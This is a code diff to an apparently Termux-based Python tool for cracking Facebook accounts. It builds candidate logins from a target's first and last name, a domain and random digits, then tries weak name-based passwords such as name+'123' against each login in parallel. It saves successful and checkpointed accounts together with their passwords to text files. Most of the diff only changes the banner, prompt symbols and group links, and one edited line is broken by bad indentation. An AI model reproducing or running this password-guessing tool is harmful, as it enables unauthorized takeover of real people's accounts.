@@ -87,9 +87,9 @@ logo = ("""\x1b[1;97m
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
-\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1.9
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
+\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
 __________________________________________________""")
 
 class Main:
@@ -99,7 +99,7 @@ class Main:
         self.cp = []
         self.loop = 0
         os.system("clear")
-        os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
+        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
         print(logo)
         print(" [1] FACEBOOK EMAIL CLONING")
         print(" [2] FACEBOOK USER NAME CLONING")
@@ -122,10 +122,10 @@ def v1():
     os.system('clear')
     os.system('xdg-open https://facebook.com/groups/3206414299669908/')
     print(logo)
-    kode = input(' [💉]  target fast name : ')
-    kodex = input(' [💉] target last name :  ')
-    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
-    doamin = input(' [📧]  Input Doamin  : ')
+    kode = input('[√]  TARGET FAST NAME : ')
+    kodex = input('[√] TARGET LAST NAME :  ')
+    print(' [√] Example Doamin : @gmail.com, @yahoo.com ')
+    doamin = input(' [√]  Input Doamin  : ')
     limit = int(input('[?] How many numbers do you want to add : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
@@ -134,26 +134,27 @@ def v1():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' [♤]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [♤]  Target Doamin:\033[1;92m {doamin}")
-        print(' \033[1;97m[♤]  The process has been started')
-        print(' [♤]  Wait for ids ')
+        print(' [√]  Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m [√]  Target Doamin:\033[1;92m {doamin}")
+        print(' \033[1;97m[√]  The process has been started')
+        print(' [√]  Wait for ids ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
-    print(50*'_')
-    print(' [♤] Crack process has been completed')
-    print(' [♤] Ids saved in ok.txt,cp.txt')
+   
+ print(50*'_')
+    print(' [√] Crack process has been completed')
+    print(' [√] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def v2():
     user=[]
     os.system('clear')
     os.system('xdg-open https://facebook.com/groups/3206414299669908/')
     print(logo)
-    kode = input(' [💉]  target fast name : ')
-    kodex = input(' [💉] target last name :  ')
+    kode = input(' [√]  TARGET FAST NAME : ')
+    kodex = input(' [√] TARGET LAST NAME :  ')
     doamin = '.'
     limit = int(input('[?] How many numbers do you want to add : '))
     for nmbr in range(limit):
@@ -163,25 +164,25 @@ def v2():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' [♤]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [♤]  Target Doamin:\033[1;92m Facebook CLONING (name)")
-        print(' \033[1;97m[♤]  The process has been started')
-        print(' [♤]  Wait for ids ')
+        print(' [★]  Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m [★]  Target Doamin:\033[1;92m Facebook CLONING (name)")
+        print(' \033[1;97m[★]  The process has been started')
+        print(' [★]  Wait for ids ')
         print(50*'_')
         for guru in user:
             uid = kode+doamin+kodex+guru
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
-    print(' [♤] Crack process has been completed')
-    print(' [♤] Ids saved in ok.txt,cp.txt')
+    print(' [√] Crack process has been completed')
+    print(' [√] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def v3():
     user=[]
     os.system('clear')
     os.system('xdg-open https://facebook.com/groups/3206414299669908/')
     print(logo)
-    print('[017]  [016]   [018]   [019]')
+    print('Example [017]  [016]   [018]   [019]')
     kode = input(' [√] Enter sim code: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
@@ -195,9 +196,9 @@ def v3():
         os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
         print(logo)
         tl = str(len(user))
-        print(' [√]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [√]  Target Doamin:\033[1;92m {doamin}")
-        print(' \033[1;97m[√]  The process has been started')
+        print(' [★] Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m [★] Target Doamin:\033[1;92m {doamin}")
+        print(' \033[1;97m[√] The process has been started')
         print(' [√]  Wait for ids ')
         print(50*'_')
         for guru in user:
@@ -260,7 +261,7 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[R4FSAN-CP🔒] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[R4FSAN-CP] {uid}|{ps}")
                 open('/sdcard/R4FSAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
